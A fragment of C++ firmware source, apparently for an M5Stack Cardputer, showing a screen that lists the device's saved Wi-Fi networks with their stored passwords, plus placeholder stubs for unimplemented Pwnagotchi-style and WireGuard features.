    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.drawString("WIFI PASS RECOVERY", 4, 28);

    logClear();
    for (const String &ssid : ssids) {
        String pwd = kitenConfig.getWifiPassword(ssid);
        logPrint(ssid + " : " + (pwd.length() ? pwd : "(open)"));
    }
    logPrint("");
    logPrint("Press any key to exit");
    logRender();

    waitAllKeysReleased();
    while (!check(AnyKeyPress)) {
        M5.update();
        pollKeyboard();
        delay(10);
    }
    waitAllKeysReleased();
}

void brucegotchi_start()
{
    displayInfo(
        "KITENgotchi needs the\n"
        "Pwnagotchi agent + AI\n"
        "logic which is too\n"
        "heavy for Cardputer.\n"
        "Coming in a future\n"
        "KITEN build.",
        true);
}

void wg_setup()
{
    displayInfo(
        "WireGuard needs the\n"
        "WireGuard-ESP32 lib.\n"
        "Add it to platformio.ini\n"
        "lib_deps to enable.",
        true);
}
